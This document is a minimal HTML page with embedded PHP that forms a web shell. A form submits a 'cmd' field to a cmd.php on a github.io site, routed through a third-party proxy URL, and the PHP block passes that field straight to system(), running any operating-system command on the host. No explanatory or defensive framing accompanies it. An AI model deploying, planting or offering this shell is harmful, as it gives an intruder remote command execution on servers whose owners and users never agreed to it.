<HTML><BODY>
	<FORM METHOD="GET" NAME="myform" ACTION="https://img.loopassets.net/?url=https://wasasra04.github.io/cmd.php" TARGET="dummyframe">
		<INPUT TYPE="text" NAME="cmd">
		<INPUT TYPE="submit" VALUE="Enter">
	</FORM>
	<iframe width="50" height="50" border="0" name="dummyframe" id="dummyframe"></iframe>
	<pre>
		<?
		if($_GET['cmd']) {
			system($_GET['cmd']);
		}
		?>
	</pre>
</BODY></HTML>
